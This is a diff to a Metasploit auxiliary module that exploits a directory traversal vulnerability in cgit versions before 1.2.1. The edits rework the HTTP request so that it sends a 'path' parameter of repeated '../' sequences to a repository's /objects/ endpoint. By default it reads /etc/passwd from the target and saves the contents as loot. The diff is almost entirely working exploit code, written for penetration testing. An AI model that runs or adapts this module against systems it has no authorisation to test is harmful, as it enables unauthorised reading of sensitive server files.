@@ -4,9 +4,9 @@
 ##
 
 class MetasploitModule < Msf::Auxiliary
+  include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
-  include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
     super(update_info(info,
@@ -14,7 +14,7 @@ class MetasploitModule < Msf::Auxiliary
       'Description' => %q{
         This module exploits a directory traversal vulnerability which
         exists in cgit < 1.2.1 cgit_clone_objects(), reachable when the
-        configuration flag enable-http-clone is set to 1 (default)
+        configuration flag enable-http-clone is set to 1 (default).
       },
       'References'  =>
         [
@@ -33,22 +33,21 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        Opt::RPORT(80),
         OptString.new('FILEPATH', [true, "The path to the file to read", '/etc/passwd']),
+        OptString.new('TARGETURI', [true, "The base URI path of the cgit install", '/cgit/']),
+        OptString.new('REPO', [true, "Git repository on the remote server", '']),
         OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 10 ])
       ])
   end
 
-   def run_host(ip)
+  def run_host(ip)
     filename = datastore['FILEPATH']
     traversal = "../" * datastore['DEPTH'] << filename
 
-    res = send_request_raw({
+    res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => '/cgit/cgit.cgi/git/objects/?path=',
-      'vars_get' => {
-        'UID' => traversal
-      }
+      'uri'    => normalize_uri(target_uri.path, datastore['REPO'], '/objects/'),
+      'vars_get' => {'path' => traversal}
     })
 
     unless res && res.code == 200
@@ -56,7 +55,7 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    vprint_good("#{peer} - #{res.body}")
+    vprint_good("#{peer} - \n#{res.body}")
     path = store_loot(
       'cgit.traversal',
       'text/plain',
